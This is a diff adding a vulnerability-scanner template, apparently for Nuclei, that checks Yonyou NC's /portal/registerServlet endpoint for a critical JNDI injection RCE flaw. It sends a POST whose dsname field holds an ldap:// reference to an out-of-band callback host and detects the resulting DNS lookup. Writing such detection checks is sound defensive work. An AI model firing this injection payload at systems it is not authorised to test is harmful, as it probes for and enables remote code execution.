@@ -1,0 +1,30 @@
+id: yongyouNC-registerServlet-jndi-rce
+info:
+  name: "用友 NC registerServlet 接口 JNDI 注入导致 RCE 漏洞"
+  author: Unknown
+  severity: critical
+  description: 用友NC registerServlet 接口存在未经验证的JNDI注入缺陷，攻击者可通过构造恶意外部资源引用链触发远程代码执行。该漏洞允许在目标服务器上下文中任意执行系统命令，实现持久化控制并横向渗透内网资源。漏洞本质源于对用户输入的JNDI字符串缺乏有效过滤，配合特定类加载机制达成代码注入。此缺陷的CVSS评分需结合实际网络拓扑与防护策略综合评估。
+  tags: 用友NC
+
+http:
+- raw:
+  - |
+    POST /portal/registerServlet HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9 
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6
+    Content-Type: application/x-www-form-urlencoded
+
+    type=1&dsname=ldap://{{interactsh-url}}
+
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
+
+
+
+
+
